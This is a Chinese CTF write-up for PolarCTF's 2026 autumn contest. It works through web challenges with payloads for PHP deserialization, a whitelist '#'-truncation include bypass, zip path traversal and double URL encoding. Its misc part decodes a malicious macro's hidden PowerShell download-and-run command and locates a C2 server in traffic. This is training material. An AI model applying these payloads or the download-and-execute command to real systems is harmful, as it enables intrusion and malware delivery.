---
title: 【先知】2026polarctf秋季赛部分题解
source: https://xz.aliyun.com/news/92787
source_host: xz.aliyun.com
clip_date: 2026-09-11T13:37:27+08:00
trace_id: 984f554f-5a45-4c1a-abc8-e11d42f0f845
content_hash: a807c3741647d798691f335890c96169859399f132a77aa4ff7692a98983b6e7
status: synced
tags:
  - 先知
  - CTF
  - 漏洞分析
series: null
feed_source: 先知安全技术社区
ai_summary: 2026 polarctf秋季赛题解：Web 靠反序列化、白名单截断、ZIP 路径穿越和双重编码拿 flag；Misc 用零宽字符、宏解码与 C2 流量定位得分。
ai_summary_style: key-points
images_status:
  total: 23
  succeeded: 23
  failed_urls: []
notion_page_id: 3d875244-d011-811f-8f70-ebdf468b40ca
ioc:
  cves: []
  cwes: []
  hashes:
    - 31626d648f81d06d6ce180ba733b9b0f
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 2026 polarctf秋季赛题解：Web 靠反序列化、白名单截断、ZIP 路径穿越和双重编码拿 flag；Misc 用零宽字符、宏解码与 C2 流量定位得分。
> 
> - **贪吃蛇/打赏：** 直接 POST `{"score":"999999999999999"}` 给 api.php；打赏页任意邮箱触发模拟支付，注释密文 QD2AHXMGSJMMG2NM 经首位反转再 Base32 解密。
> - **PHP 反序列化：** AuditTicket 的 `__destruct` 在 `role=admin` 时输出 flag；魔法导入器用 `O:7:"Welcome":1:{s:4:"user";O:10:"FileViewer":1:{s:4:"path";S:5:"/\66lag";}}`，借大写 `S:` 十六进制转义绕过小写 flag 正则。
> - **文件包含/上传：** MiniSite 用 `/?f=source.php%23/../../../../sssseeeeccccrrrrreeeetttt` 绕过 FileGuard；guess 用 zip 内条目 `../../../templates/memo.html` 路径穿越覆盖模板，访问 `/memo` 读 `{{flag}}`。
> - **Cookie/路由与 Misc：** ctf123.php 需 Cookie `role=auditor`，`route=%2561%2564%256d%2569%256e%2Fpanel` 双重 URL 编码绕 admin；letter 按 200B/200C 零宽字符转二进制；docm 宏 Base64+XOR 0x23 得下载 URL，C2 为 `203.0.113.45`，DNS 查 `c2.greylinx-consulting.xyz`。

## web

## 贪吃蛇

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3ac0789e9aead0ee.png)  
有点难玩，直接看源代码  
重点代码片段

```javascript
function submitScore(finalScoreValue) {
            fetch('api.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({score: finalScoreValue})
            })
            .then(function(resp) { return resp.json(); })
            .then(function(data) {
                rewardPanel.style.display = 'block';
                if (data.success) {
                    rewardPanel.innerHTML = '&#127942; 隐藏奖励解锁！<br>' + data.message;
                } else {
                    rewardPanel.innerHTML = data.message;
                }
            })
            .catch(function() {
                rewardPanel.style.display = 'block';
                rewardPanel.innerHTML = '成绩提交失败，请稍后再试';
            });
        }
```

我们向api.php发送POST请求 `{"score":"999999999999999"}` 即可拿到flag

## php反序列

```php
<?php
session_start();
error_reporting(0);

if (empty($_SESSION['logged_in'])) {
    header('Location: index.php');
    exit;
}

include __DIR__ . '/flag.php';

class AuditTicket
{
    public $role = 'guest';

    public function __destruct()
    {
        global $flag;

        if ($this->role === 'admin') {
            echo '<h3 style="color:green">反序列化成功！</h3>';
            echo '<p>' . htmlspecialchars($flag, ENT_QUOTES, 'UTF-8') . '</p>';
        }
    }
}

$message = '';
$object = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $payload = $_POST['payload'] ?? '';

    if ($payload === '') {
        $message = 'payload 不能为空';
    } else {
        $object = unserialize($payload);

        if ($object instanceof AuditTicket) {
            $message = '对象恢复成功';
        } else {
            $message = '反序列化失败';
        }
    }
}

highlight_file(__FILE__);
?>
```

脚本

```php
<?php
class AuditTicket
{
    public $role = 'admin';
}

$a=new AuditTicket();
$b=serialize($a);
echo $b;
```

## 消消乐

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6cae3bc356a551b0.png)  
游戏不算难可以直接玩出来  
查看源代码  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/199747151ee275e3.png)

数据来源

```plain
<div id="app-meta" data-v="0731626d648f81d06d6ce180ba733b9b0f" hidden></div>
```

下面会用到他

```plain
var hex = cfg.dataset.v.substr(2);   // 丢掉 "07"
// hex = "31626d648f81d06d6ce180ba733b9b0f"  (32 位 = 16 字节)
```

这里可以直接在控制台得到输出  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8c66e1fdac4298b7.png)

逐字节 XOR 解密(密钥 = 0x37)

```plain
var key = 0x37;                         // 固定密钥(十进制 55)
var bytes = [];
for (var i = 0; i < hex.length; i += 2) {
    bytes.push(parseInt(hex.substr(i, 2), 16) ^ key);
}
```

```plain
31^37=06  62^37=55  6d^37=5a  64^37=53
8f^37=b8  81^37=b6  d0^37=e7  6d^37=5a
6c^37=5b  e1^37=d6  80^37=b7  ba^37=8d
73^37=44  3b^37=0c  9b^37=ac  0f^37=38
```

解密出的 16 个字节:`06 55 5a 53 b8 b6 e7 5a 5b d6 b7 8d 44 0c ac 38`  
再套flag壳

```plain
var result = String.fromCharCode(102,108,97,103,123) + hash + String.fromCharCode(125);
```

`fromCharCode` 逐个转字符:

|     |     |
| --- | --- | 
| 码   | 字符  |
| 102 | f   |
| 108 | l   |
| 97  | a   |
| 103 | g   |
| 123 | {   |
| 125 | }   |
| 即 `"flag{" + hash + "}"` 。 |     |

## guess

/memo查看备忘文件

```plain
<h1>备忘卡片</h1>
<pre>comet archive initialized</pre>
<p class="small">核心变量已进入渲染上下文，但默认模板不会展示。</p>
```

/status  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e6d5d00f24ab3d5e.png)

/theme  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/941cb29ed14090ed.png)  
文件上传  
尝试上传一个正常的符合要求的.zip，回显得到id  
但是/status里提示的目录都是404...  
我们大概能猜到/memo是/app/templates/memo.html  
上传一个简单的memo.html测试

```plain
<pre>{{ 7*7 }}</pre>
```

可是/memo没反应  
据说zip解压有一个古老的坑  
解压过程中文件名可能会被直接拼接到路径中，造成路径穿越漏洞  
但是windows的文件名不允许有/  
借助pyhton脚本

```python
import zipfile

with zipfile.ZipFile("theme.zip", "w") as z:
    z.writestr("manifest.txt", "name=x\n")
    z.writestr("../../../templates/memo.html", "<pre>{{flag}}</pre>")
```

上传后访问/memo拿到flag

## 打赏

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ccc735e071988c23.png)  
打赏后拿到假flag  
查看源代码

```plain
// 自定义你的flag
        const flag = "flag{Fake_Pay_No_Money_2026_HTML}";
        function showFlag() {
            let emailVal = document.getElementById("mail").value;
            //不校验真实邮箱、无支付流程
            if (emailVal.length > 0) {
                alert("模拟支付成功，无需真实转账！\n你的flag：" + flag);
            } else {
                alert("邮箱框随便输入任意字符即可模拟支付拿flag");
                //QD2AHXMGSJMMG2NM
            }
        }
```

下面有一个加密的注释，尝试解密  
这里真搓不出来，问了ds是先首位反转再base32解码  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6847e73e282b898c.png)  
访问ctf123.php

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include __DIR__ . '/flag.php';

echo "<h2>Welcome</h2>";

function stop($msg) {
    die(htmlspecialchars($msg, ENT_QUOTES, 'UTF-8') . "<br/>\n");
} 

$role = $_COOKIE['role'] ?? 'guest';

if ($role !== 'auditor') {
    stop('第一关：你还不是 auditor');
}

echo "第一关通过<br/>\n";

$route = $_GET['route'] ?? '';

if (preg_match('/admin/i', $route)) {
    stop('第二关：检测到敏感路由 admin');
}

$route = urldecode($route);

if ($route !== 'admin/panel') {
    stop('第二关：没有进入管理路由');
}

echo "第二关通过<br/>\n";
echo "恭喜通关！<br/>\n";
echo htmlspecialchars($flag, ENT_QUOTES, 'UTF-8');
?>
```

第一关

```plain
Cookie: role=auditor
```

第二关把admin双重url编码

```plain
/ctf123.php?route=%2561%2564%256d%2569%256e%2Fpanel
```

拿到flag

## MiniSite

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3b4ecb4a48c88b85.png)  
右上角三个功能分别访问  
/?f=home.php  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/421e0edad717c820.png)  
/?f=about.php  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/30170be649322ee3.png)  
/?f=source.php  
提示：index.php 的完整源码 —— 仔细看看 FileGuard 是怎么校验的。  
**Hint:** 校验通过后， `include` 用的是哪个变量？它和校验时看到的一样吗？  
Mini Site · 有些文件不在白名单里，也不在 web 根目录下

```php
<?php
// TODO: 上线前删掉这行 —— /sssseeeeccccrrrrreeeetttt 别忘了清理

class FileGuard
{
    public static function checkFile(&$page)
    {
        $whitelist = ["home.php", "about.php", "source.php"];

        if (!isset($page) || !is_string($page)) {
            echo "you can't see it";
            return false;
        }
        if (in_array($page, $whitelist, true)) {
            return true;
        }
        $_page = substr(
            $page,
            0,
            strpos($page . '#', '#')
        );
        if (in_array($_page, $whitelist, true)) {
            return true;
        }

        $_page = rawurldecode($page);
        $_page = substr(
            $_page,
            0,
            strpos($_page . '#', '#')
        );
        if (in_array($_page, $whitelist, true)) {
            return true;
        }

        echo "you can't see it";
        return false;
    }
}

if (!empty($_REQUEST['f'])
    && is_string($_REQUEST['f'])
    && FileGuard::checkFile($_REQUEST['f'])
) {
    include $_REQUEST['f'];
    exit;
}
?>
<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>MiniSite </title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  :root{
    --bg:#0a0e1a;--card:rgba(19,24,38,.72);--accent:#00ff9d;--accent2:#00d4ff;
    --text:#c8d3e6;--muted:#6b7a99;--border:rgba(0,255,157,.18);
  }
  body{
    font-family:'Segoe UI',system-ui,-apple-system,sans-serif;color:var(--text);
    min-height:100vh;display:flex;flex-direction:column;
    background:var(--bg);
    background-image:
      radial-gradient(ellipse 80% 50% at 50% -10%,rgba(0,212,255,.10),transparent),
      radial-gradient(ellipse 60% 40% at 90% 110%,rgba(0,255,157,.08),transparent),
      linear-gradient(rgba(31,41,64,.25) 1px,transparent 1px),
      linear-gradient(90deg,rgba(31,41,64,.25) 1px,transparent 1px);
    background-size:100% 100%,100% 100%,42px 42px,42px 42px;
    background-attachment:fixed;
  }
  /* nav */
  nav{position:sticky;top:0;z-index:10;backdrop-filter:blur(12px);
    background:rgba(10,14,26,.7);border-bottom:1px solid var(--border);
    box-shadow:0 4px 30px rgba(0,0,0,.4)}
  .nav-inner{max-width:960px;margin:0 auto;padding:14px 24px;display:flex;
    align-items:center;gap:24px;flex-wrap:wrap}
  .logo{font-weight:800;font-size:18px;letter-spacing:1px;
    background:linear-gradient(90deg,var(--accent),var(--accent2));
    -webkit-background-clip:text;background-clip:text;color:transparent}
  .logo::before{content:"</>";margin-right:8px;opacity:.7}
  .nav-links{display:flex;gap:8px;margin-left:auto;flex-wrap:wrap}
  .nav-links a{color:var(--muted);text-decoration:none;padding:7px 16px;border-radius:8px;
    font-size:14px;font-weight:600;border:1px solid transparent;transition:.25s}
  .nav-links a:hover{color:var(--accent);background:rgba(0,255,157,.08);
    border-color:var(--border);box-shadow:0 0 18px rgba(0,255,157,.15)}
  /* main */
  main{flex:1;max-width:960px;width:100%;margin:0 auto;padding:60px 24px 40px}
  .hero{text-align:center;margin-bottom:48px;animation:fadeUp .8s ease}
  @keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
  .tag{display:inline-block;font-size:12px;letter-spacing:3px;text-transform:uppercase;
    color:var(--accent);border:1px solid var(--border);padding:5px 14px;border-radius:20px;margin-bottom:22px}
  h1{font-size:46px;font-weight:800;line-height:1.1;margin-bottom:16px;
    background:linear-gradient(120deg,#fff 30%,var(--accent2));
    -webkit-background-clip:text;background-clip:text;color:transparent}
  .sub{font-size:16px;color:var(--muted);max-width:540px;margin:0 auto;line-height:1.7}
  /* card */
  .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:20px;
    animation:fadeUp .8s .15s both}
  .card{background:var(--card);border:1px solid var(--border);border-radius:16px;
    padding:28px 24px;backdrop-filter:blur(8px);transition:.3s;position:relative;overflow:hidden}
  .card::before{content:"";position:absolute;inset:0;border-radius:16px;padding:1px;
    background:linear-gradient(135deg,var(--accent),transparent 60%);
    -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
    -webkit-mask-composite:xor;mask-composite:exclude;opacity:.5}
  .card:hover{transform:translateY(-4px);box-shadow:0 12px 40px rgba(0,255,157,.12)}
  .card .ic{font-size:30px;margin-bottom:14px;display:block}
  .card h3{font-size:17px;margin-bottom:8px}
  .card p{font-size:14px;color:var(--muted);line-height:1.6}
  .card a{color:var(--accent);text-decoration:none;font-weight:600}
  .card a:hover{text-shadow:0 0 12px rgba(0,255,157,.6)}
  /* terminal */
  .terminal{margin-top:44px;background:var(--card);border:1px solid var(--border);
    border-radius:12px;overflow:hidden;animation:fadeUp .8s .3s both}
  .term-bar{background:rgba(0,0,0,.3);padding:10px 16px;display:flex;gap:7px;
    border-bottom:1px solid var(--border);font-size:12px;color:var(--muted)}
  .term-bar i{width:12px;height:12px;border-radius:50%;display:inline-block}
  .term-bar i:nth-child(1){background:#ff5f57}.term-bar i:nth-child(2){background:#febc2e}
  .term-bar i:nth-child(3){background:#28c840}
  .term-bar span{margin-left:auto}
  .term-body{padding:20px;font-family:'Consolas','Courier New',monospace;
    font-size:13.5px;line-height:1.7;color:var(--text)}
  .term-body .prompt{color:var(--accent)}
  .term-body .out{color:var(--muted)}
  .term-body .cursor{display:inline-block;width:8px;height:15px;background:var(--accent);
    vertical-align:middle;animation:blink 1s steps(1) infinite}
  @keyframes blink{50%{opacity:0}}
  footer{text-align:center;padding:28px;font-size:13px;color:var(--muted);
    border-top:1px solid var(--border)}
  footer span{color:var(--accent)}
  @media(max-width:600px){h1{font-size:34px}.nav-inner{gap:14px}}
</style>
</head>
<body>
<nav>
  <div class="nav-inner">
    <span class="logo">Mini Site</span>
    <div class="nav-links">
      <a href="?f=home.php">Home</a>
      <a href="?f=about.php">About</a>
      <a href="?f=source.php">Source</a>
    </div>
  </div>
</nav>

<main>
  <div class="hero">
    <span class="tag">CTF Web · Medium</span>
    <h1>Can you find<br>the secret?</h1>
    <p class="sub">一个用 PHP include 搭建的迷你站点。看起来只有三个页面，但总有些文件不该出现在白名单里……</p>
  </div>

  <div class="cards">
    <div class="card">
      <span class="ic">&#128737;</span>
      <h3>FileGuard 白名单</h3>
      <p>所有文件请求都要经过三层校验。看起来无懈可击？<br><a href="?f=source.php">查看源码 &rarr;</a></p>
    </div>
    <div class="card">
      <span class="ic">&#128270;</span>
      <h3>信息收集</h3>
      <p>页面的 HTML 注释、source.php 的高亮里，藏着进入下一关的线索。</p>
    </div>
    <div class="card">
      <span class="ic">&#128682;</span>
      <h3>绕过校验</h3>
      <p>校验和执行，用的是同一个值吗？<br>仔细看看 <code>include</code> 的参数。</p>
    </div>
  </div>

  <div class="terminal">
    <div class="term-bar"><i></i><i></i><i></i><span>guest@minisite</span></div>
    <div class="term-body">
<span class="prompt">guest@minisite</span>:<span class="out">~$</span> curl "http://localhost/?f=home.php"
<span class="out">&lt;h1&gt;Home&lt;/h1&gt; ... welcome to mini site.</span>
<span class="prompt">guest@minisite</span>:<span class="out">~$</span> curl "http://localhost/?f=../../etc/passwd"
<span class="out">you can't see it</span>
<span class="prompt">guest@minisite</span>:<span class="out">~$</span> <span class="cursor"></span>
    </div>
  </div>
</main>

<footer>
  Mini Site &middot; PHP File Include Challenge &middot; <span>flag is not where you think</span>
</footer>
</body>
</html>
```

这个/sssseeeeccccrrrrreeeetttt不知道干嘛的，访问不了，f传参也不行  
继续往下看看吧

1.  直接匹配 whitelist → 返回 true
2.  带 `#` 截断后匹配 → 返回 true
3.  URL 解码后再匹配 → 返回 true
4.  都没匹配到 → 返回 false  
    我们尝试使用#截断配合路径穿越

```plain
/?f=source.php%23/../about.php
```

成功穿越到about.php  
去看看/sssseeeeccccrrrrreeeetttt  
最终payload

```plain
/?f=source.php%23/../../../../sssseeeeccccrrrrreeeetttt
```

flag就在这里

## 魔法导入器

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/37107061a2f02b8d.png)  
查看源代码  
/?source

```php
<?php
class FileViewer
{
    public $path;

    public function __toString()#验证文件路径存在并包含
    {
        if ($this->path && file_exists($this->path)) {
            return file_get_contents($this->path);
        }
        return "[文件未找到]";
    }
}

class Welcome
{
    public $user;

    public function __destruct()
    {
        echo "<div class='bye-msg'>再见，" . $this->user . "！</div>";
    }
}

class Profile
{
    public $name;
    public $bio;

    public function __wakeup()
    {
        if (strlen($this->name) > 30) {
            $this->name = substr($this->name, 0, 30);
        }
        if (strlen($this->bio) > 200) {
            $this->bio = substr($this->bio, 0, 200);
        }
    }
}

function validate_serialized($data)
{
    $rules = [
        '/s:\d+:"[^"]*flag[^"]*"/' => '拦截：检测到 flag 路径 (s:string)',
        '/O:\d+:"(?!Welcome|Profile|FileViewer)[^"]+"/' => '拦截：不允许的类',
    ];
    foreach ($rules as $pattern => $msg) {
        if (preg_match($pattern, $data)) {
            return [false, $msg];
        }
    }
    return [true, '验证通过'];
}

// Source code view
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit;
}

// Logic
$result = '';
$error = '';
$destruct_output = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $raw = trim($_POST['data']);

    list($ok, $msg) = validate_serialized($raw);
    if (!$ok) {
        $error = $msg;
    } else {
        $obj = @unserialize($raw);
        if ($obj === false && $raw !== 'b:0;') {
            $error = '反序列化失败：格式无效';
        } else {
            $result = '导入成功！对象类型：' . get_class($obj);
            // Force __destruct() NOW so output is visible on page
            ob_start();
            $obj = null;
            $destruct_output = ob_get_clean();
        }
    }
}

$demo = new Profile();
$demo->name = 'Alice';
$demo->bio = 'CTF Player';
$export = serialize($demo);
?>
```

观察发现我们应该用FileViewer的\__toString方法读取文件  
但是这个方法只是return，没有输出  
正好我们借助Welcome的魔术方法\__destruct输出，还可以触发\__toString

```php
<?php
class FileViewer
{
    public $path;

    public function __toString()#验证文件路径存在并包含
    {
        if ($this->path && file_exists($this->path)) {
            return file_get_contents($this->path);
        }
        return "[文件未找到]";
    }
}

class Welcome
{
    public $user;

    public function __destruct()
    {
        echo "<div class='bye-msg'>再见，" . $this->user . "！</div>";
    }
}

$demo = new Welcome();
$demo->user = new FileViewer();
$demo->user->path = "/etc/passwd"; #这里可以改成你想要读取的文件路径
$export = serialize($demo);
echo $export;
?>
```

可以读取文件了，但是过滤比较严格  
看到还有一个类没用上

```php
class Profile
{
    public $name;
    public $bio;

    public function __wakeup()
    {
        if (strlen($this->name) > 30) {
            $this->name = substr($this->name, 0, 30);
        }
        if (strlen($this->bio) > 200) {
            $this->bio = substr($this->bio, 0, 200);
        }
    }
}
```

可以帮助我们处理字符长度  
但是题目逻辑是先进行过滤再反序列化  
思考能不能直接绕过过滤，尝试在序列化字符串中加入"破坏正则判断，同时搭配路径穿越  
好消息是

```plain
/etc/../1"/../flag
```

确实没有触发waf  
坏消息是回显文件未找到，同样的方法读取/etc/passwd也是文件未找到  
原理回头再研究  
正确思路是  
正则waf只匹配了小写x，放过了大写S  
大写 `S:` 表示字符串中可用 `\xx` （两位十六进制）转义字节  
把 `flag` 的 `f` （0x66）写成 `\66` ，即 `S:5:"/\66lag"`  
最终payload

```plain
O:7:"Welcome":1:{s:4:"user";O:10:"FileViewer":1:{s:4:"path";S:5:"/\66lag";}}
```

好了，现在看看为什么路径穿越的方法不行  
之前就在windows和linux上做过实验  
其实是可以实现路径穿越的  
唯一不同就是windows可以一个引号 `/1"/../` 穿越  
但linux必须要闭合引号才会执行 `/1""/../`  
问下ai

|     |     |     |
| --- | --- | --- |  
| 你的 `cd` （逻辑） | 服务器 `file_get_contents` （物理） |     |
| 谁解析 `..` | bash 在字符串层面折叠 | 内核逐组件查目录 |
| `X/..` 要求 X 存在吗 | 不要求（先折叠掉） | **要求** （查不到就 ENOENT） |
| `"` 去哪了 | 被 shell 吃掉，变 `1` | PHP 字符串里的真实字节，成文件名 |
| 原来这样吗 |     |     |
| 可惜linux默认没有文件名包含"的文件，不然还能操作一下 |     |     |
| 此路不通 |     |     |

## 预言三问

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/256ab7fce418e029.png)  
得x=78  
设置cookie=78  
回显

```plain
预言家,现在的交流方法不太安全,改成一个安全的方式吧。而且你是知道女祭司和预言家是一对的,别忘用英语写在数据里哦。
```

抓包看看  
没东西啊，难道说？  
POST传参  
priestess=prophet  
提示要管理员等于一  
再get传参?admin=1  
拿到flag....

## misc

## letter

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4454599e8c499d93.png)  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ef423467fbbe6b7e.png)  
全是200C和200B  
脚本如下

```python
data = open(r'E:\firefox\letter\letter.txt', encoding='utf-8').read().rstrip('\n')
bits = ''.join('0' if c == '\u200b' else '1' for c in data if c in '\u200b\u200c')
print(''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)))
```

## deploy-2

> 还原 docm 宏里混淆的 PowerShell 命令，得到下载 payload 的完整 URL。

下载了.docm文件，我们改后缀为.zip  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f6c7c65cfc544923.png)  
查看.bin文件

```plain
D0 CF 11 E0 A1 B1 1A E1                                                                                                                        VBA_Project_Payload_v1_GreyLynxAttribute VB_Name = "Module1"
' GreyLynx payroll update bootstrap
' NOTE: string below is encoded: base64(XOR 0x23(payload))
Sub AutoOpen()
    Dim enc As String
    enc = "U0xURlFQS0ZPTwMOTUxTAw5UA0tKR0dGTQMOQAMBRkBLTAN4CX4DZFFGWm9aTVsDVlNHQldGA0FMTFdQV1FCUxgDSlRRA0tXV1MZDAxAR00NRFFGWk9KTVsOQExNUFZPV0pNRA1bWlkZGxMbEwxWU0dCV0YMUFVADUZbRgMObFZXZUpPRgMHRk1VGXdmbnN/UFVADUZbRhgDUFdCUVcDB0ZNVRl3Zm5zf1BVQA1GW0YB"
    Dim ps As String
    ps = DecodeXor(enc)
    Shell ps, vbHide
End Sub

Function DecodeXor(s As String) As String
    ' decode chain: Base64 decode, then XOR each byte with 0x23
    DecodeXor = s
End Function
```

简单加密  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6697ebca85c3ce9f.png)

```plain
powershell -nop -w hidden -c "echo [*] GreyLynx update bootstrap; iwr http://cdn.greylinx-consulting.xyz:8080/update/svc.exe -OutFile $env:TEMP\svc.exe; start $env:TEMP\svc.exe"
```

flag是cdn.greylinx-consulting.xyz:8080/update/svc.exe不包括http:

## deploy-3

> C2 服务器的 IP:端口。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4633f5493d259e33.png)  
wireshark打开  
过滤流量

```plain
http.request.method == POST and http.request.uri contains "gate.php"
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/670a16fdbdcc482e.png)  
发现destination是 **203.0.113.45**  
其实这就是外联的c2服务器的ip  
继续往下翻还有域名和端口  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b5a1291b9e0bc216.png)  
不过做的时候我是右键-FOLLOW-http stream  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fc6e3bbec71ef6ae.png)  
只拿到了域名和端口  
然后去找dns的解析记录

```latex
dns.qry.name contains "c2.greylinx-consulting.xyz"
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7050c6bcdf5a8ea2.png)  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10a330ef491e6a43.png)

## 星辰科技

扫目录扫到robots.txt就好做了
